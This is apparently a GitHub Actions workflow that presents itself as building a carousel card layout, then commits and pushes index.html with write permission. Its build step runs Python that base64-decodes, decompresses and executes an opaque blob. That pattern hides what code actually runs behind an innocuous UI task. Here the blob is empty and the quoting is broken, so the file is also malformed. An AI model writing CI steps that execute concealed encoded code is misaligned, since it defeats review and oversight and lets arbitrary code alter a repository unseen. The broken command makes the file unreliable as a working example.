name: Carousel card layout

on:
  push:
    paths:
      - '.github/workflows/carousel-card-layout.yml'

permissions:
  contents: write

jobs:
  patch:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Build horizontal perspective carousel
        shell: bash
        run: python -c "import base64,zlib; exec(zlib.decompress(base64.b64decode('')))
      - name: Commit changes
        run: |
          git config user.name "github-actions[bot]"
          git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
          git add index.html
          git commit -m "Redesign cards as perspective carousel"
          git push
